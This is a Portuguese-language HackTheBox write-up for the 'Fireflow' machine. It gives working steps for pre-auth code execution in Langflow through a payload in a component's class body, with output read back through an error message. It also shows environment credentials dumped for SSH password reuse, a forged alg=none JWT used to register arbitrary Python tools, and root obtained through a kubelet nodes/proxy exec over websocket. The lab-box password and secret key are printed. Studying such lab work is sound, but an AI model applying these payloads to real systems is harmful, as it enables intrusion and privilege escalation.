# Fireflow

## informações da máquina

| atributo | valor |
|----------|-------|
| **plataforma** | HackTheBox |
| **dificuldade** | Medium |
| **OS** | Linux |
| **IP** | 10.129.114.66 |
| **técnicas** | Langflow component code exec (class body), credential disclosure, password reuse, JWT alg=none, k8s nodes/proxy access, kubelet exec legado via websocket |
| **link HTB** | [https://app.hackthebox.com/machines/Fireflow](https://app.hackthebox.com/machines/Fireflow) |

## resumo

a máquina expõe um site institucional ("FireFlow — Task Force Nightfall") em 443 e um vhost `flow.fireflow.htb` rodando **Langflow 1.8.2** com playground público. o CVE clássico de Langflow (CVE-2025-3248) está corrigido na versão; o foothold vem do loader de componentes: o código de cada componente é extraído por AST e **só o corpo da classe é compilado** — mas corpo de classe executa. injetando statements no fim da classe original do fluxo público, qualquer visitor não-autenticado do `build_public_tmp` ganha RCE como `www-data`.

o `.env` do serviço entrega o par `LANGFLOW_SUPERUSER`/`LANGFLOW_SUPERUSER_PASSWORD`. a senha é reutilizada pelo usuário de sistema `nightfall` — esse teste de SSH era o caminho intended e só entrou na run depois (o registro honesto: a senha estava no primeiro dump de env e o sweep de reuso não rodou; horas de cadeia k8s até confirmar o comando óbvio).

para root, o caminho alternativo seguido na run: um pod k8s roda o "MCP AI Tool Registry", cuja API anuncia suporte a `alg: none` em JWT e aceita registro de tools com Python arbitrário. o SA do pod tem `get` em `nodes/proxy`, o que dá leitura total do kubelet e — pelo endpoint legado de exec via GET + websocket — execução root no pod `node-exporter` (privileged, hostPath `/`). a flag está em `/host/root/root/root.txt`.

## enumeração/scanning

### port scanning

```bash
nmap -sC -sV -oA scans/fireflow-initial 10.129.244.214
```

```text
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
443/tcp   open     ssl/http  nginx
|_http-title: FireFlow — Task Force Nightfall
| ssl-cert: SAN: DNS:fireflow.htb, DNS:*.fireflow.htb
```

portas altas `filtered` (30000, 31337...) — depois reveladas como NodePorts do cluster k3s por trás de firewall. o SAN com wildcard anuncia vhosts.

### web: vhost e identificação do Langflow

a homepage publica o fio condutor no bloco de status: `Flow engine 1.8.2`, `MCP Tool Registry: online`, e um botão "Open Agent" apontando para:

```text
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

o HTML do playground entrega o `<title>Langflow</title>` e o bundle SPA. os endpoints padrão confirmam:

```bash
curl -sk --resolve flow.fireflow.htb:443:10.129.114.66 https://flow.fireflow.htb/api/v1/version
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

`/docs` e `/openapi.json` do FastAPI estão expostos sem auth — a spec completa lista dois grupos de rotas: as com `security` e um punhado aberto. o interessante:

- `POST /api/v1/build_public_tmp/{flow_id}/flow` — "Build a public flow without requiring authentication"
- `GET /api/v1/flows/public_flow/{flow_id}` — lê o JSON do fluxo público
- `POST /api/v1/users/` — registro aberto (mas `NEW_USER_IS_ACTIVE=False` vira login bloqueado: "Waiting for approval")
- `POST /api/v1/mcp/...` — handlers MCP, todos exigindo API key

checagem do CVE óbvio: o RCE de `/api/v1/validate/code` (CVE-2025-3248) foi corrigido no 1.3.0; 1.8.2 está fora da janela. o caminho é outro: o playground público + um fluxo `access_type: PUBLIC` com `mcp_enabled: True` é a superfície.

## exploitation

### o fluxo público e o teste de canário

o JSON do fluxo público ("Agent Dev") tem três nós: `ChatInput → TextOperations → ChatOutput`. todo componente Langflow carrega um campo `code` com o Python da classe no template. hipótese imediata: o `build_public_tmp` aceita `data` no body (schema `FlowDataRequest` com nodes/edges arbitrários) e o `code` viaja junto — RCE direto.

primeiro payload: `raise RuntimeError(...)` com saída de `id` no nível de módulo do `code`. o build completou **normalmente**, com o texto original do fluxo. nada executou.

antes de concluir qualquer coisa, o teste de canário: trocar `replacement_text` para uma string única e reenviar. a saída mudou — **o `data` enviado é respeitado**; só o `code` editado é ignorado.

sem o canário, a conclusão errada teria matado a via certa: o teste separou as duas hipóteses (servidor ignora `data` vs. servidor ignora só `code`).

### lendo o loader do componente

com o pacote real em mãos (`langflow 1.8.2` no PyPI é um shim que puxa `langflow-base 0.8.2` + `lfx 0.3.2`), o caminho do build é:

```python
# lfx/interface/initialize/loading.py
code = custom_params.pop("code")
class_object = eval_custom_component_code(code)
```

e `eval_custom_component_code` → `validate.create_class(code, class_name)`:

```python
# lfx/custom/validate.py
module = ast.parse(code)                     # parse — não executa
class_code = extract_class_code(module, class_name)  # extrai SÓ a classe
compiled_class = compile_class_code(class_code)
return build_class_constructor(compiled_class, exec_globals, class_name)
```

código de nível de módulo é descartado — o payload morreu aí. mas `compile_class_code` compila o corpo da classe, e corpo de classe **executa** na criação. o mesmo princípio dos default-args do CVE-2025-3248, na variante que sobreviveu ao patch.

### RCE via corpo da classe

payload colado no fim do corpo da classe original do `TextOperations` (mantendo o node id, que os tweaks respeitam):

```python
    _p = __import__('subprocess').run('id; hostname; uname -a', shell=True, capture_output=True, text=True)
    raise RuntimeError('RCEDUMP[' + _p.stdout + _p.stderr + ']RCEDUMP')
```

o `raise` no corpo da classe sobe no `create_class`, vira erro do vertex e a mensagem volta nos eventos do build — canal de output sem listener:

```bash
curl -sk -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/$FLOW_ID/flow" \
  -H "Content-Type: application/json" -b "client_id=$(uuidgen)" -d @rce3-req.json
# → job_id, depois GET /api/v1/build_public_tmp/$JOB/events (SSE)
```

```text
RCEDUMP[uid=33(www-data) gid=33(www-data) groups=33(www-data)
fireflow
Linux fireflow 6.8.0-111-generic ... x86_64 GNU/Linux]
```

duas exigências operacionais do endpoint: cookie `client_id` (UUID qualquer, o frontend gera) e eventos lidos em stream (SSE corta com `--max-time`). RCE pré-auth, inofensivo na prova (`id`, `hostname`), com canal de output embutido no próprio erro — um runner de comandos com esse canal sustenta toda a pós-exploração.

## acesso como nightfall

### credenciais no environment do serviço

como `www-data`, o `/proc/<pid>/environ` do Langflow entrega o `.env`:

```text
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CONFIG_DIR=/var/lib/langflow
```

a senha loga no app como superuser (confirmado: listagem completa de fluxos, usuários, DB sqlite com API key Fernet — indecifrável com a key atual, gerada em build time com outro secret).

**o passo que a run pulou** — e que o writeup oficial mostra como intended: testar a senha no SSH (password reuse):

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh nightfall@fireflow.htb 'id; cat ~/user.txt'
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
```

**user flag:** ✓

## privilege escalation (via tool registry e kubelet)

a run seguiu por um caminho alternativo que a lista de endpoints abertos sugeria desde o início: o "MCP Tool Registry" anunciado na homepage roda como pod no node.

### JWT alg=none no Tool Registry

scan da rede de pods (10.42.1.0/24, acessível da rede do host via CNI) acha um FastAPI em `10.42.1.131:8080`:

```json
{"title":"MCP AI Tool Registry — Task Force Nightfall","version":"0.1.0",
 "auth":{"type":"JWT","header":"Authorization: Bearer <token>",
         "supported_algorithms":["HS256","none"]}}
```

o próprio serviço **anuncia** que aceita `alg: none`. token forjado à mão, sem lib:

```python
b = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
token = b({"alg":"none","typ":"JWT"}) + '.' + b({"sub":"admin","role":"admin","is_admin":True}) + '.'
```

com ele, `POST /api/v1/tools` registra uma tool com **código Python arbitrário**; `POST /mcp` (JSON-RPC `tools/call`) executa e devolve o stdout. RCE como `uid=1000(mcp)` — que no host é `nightfall`.

### SA com nodes/proxy

o token do SA do pod (`/var/run/secrets/kubernetes.io/serviceaccount/token`, SA `mcp-sa`) e um `SelfSubjectRulesReview` revelam a permissão:

```json
{"verbs":["get"],"apiGroups":[""],"resources":["nodes/proxy"]}
```

`GET` no kubelet (`https://10.129.114.66:10250`, direto do pod com o Bearer token):

- `/pods` — specs completos: o `node-exporter` é `privileged: true`, `runAsUser: 0`, `hostPID: true`, com hostPath `/` em `/host/root`
- `/logs/` — listagem e leitura do `/var/log` **do host**; os audit logs registraram inclusive a rotação de flags e um `sed` histórico no `/home/nightfall/.mcp/config.json`
- `POST /run/...` — **Forbidden** (`verb=create`) — a porta de execução via POST está fechada

### exec via websocket no endpoint legado

o handler legado do kubelet, `GET /exec/{ns}/{pod}/{container}`, autoriza pelo método HTTP (GET → verb `get` → permitido) e aceita upgrade websocket (`Sec-WebSocket-Protocol: v4.channel.k8s.io`). detalhe que custou quase uma hora: os params dessa rota no k3s v1.34.6 são **`output=1&error=1`**, não `stdin/stdout/stderr` do master.

```text
GET /exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter
    ?output=1&error=1&command=%2Fbin%2Fsh&command=-c&command=<payload>  → 101
```

dentro do container privilegiado, o FS do host está em `/host/root`:

```bash
/bin/sh -c "ls -la /host/root/root/; cat /host/root/root/root.txt"
```

**root flag:** ✓

`get` em `nodes/proxy` parece permissão de leitura e é execução como root: o POST bloqueado é a dica de que o caminho é o GET legado com upgrade — e a versão do k3s define o formato exato dos params.

## lições aprendidas

- **o sweep de credenciais é passo obrigatório, não ideia.** a senha do superuser do Langflow estava no primeiro dump de env e era também a senha SSH do `nightfall`. nada na box puxa de volta para o SSH quando você já está fundo na cadeia — só o processo puxa. este foi o maior custo da run.
- **pin da versão antes de ler source.** o handler de exec legado do kubelet no k3s 1.34 usa `output`/`error`; o master usa `stdin`/`stdout`/`stderr`. ler o branch errado gerou dezenas de tentativas que falhavam todas com o mesmo erro, parecendo bug do cliente.
- **canário antes de conclusão.** o teste com `replacement_text` único separou "o servidor ignora meu data" de "o servidor ignora só o code" — sem ele, a via certa teria sido descartada no primeiro payload que falhou.
- **corpo de classe executa; módulo não.** o loader do Langflow extrai a classe por AST e compila só ela. statements no fim do corpo da classe (ou default args de métodos) executam na definição — a variante do padrão do CVE-2025-3248 que sobrevive ao patch.
- **erro como canal de output.** `raise RuntimeError(saida_do_comando)` no corpo da classe transforma o evento de erro do build em canal de leitura, sem listener e sem reverse shell.
- **permissão que "só lê" pode executar.** `get` em `nodes/proxy` passou de leitura de pods/logs para exec root pelo endpoint legado com upgrade websocket — a checagem de RBAC olha o método HTTP, não a semântica da operação.
- **a homepage é parte do recon.** "MCP Tool Registry: online" estava no primeiro HTML da sessão e descrevia literalmente a via de root.

---

*writeup by kp*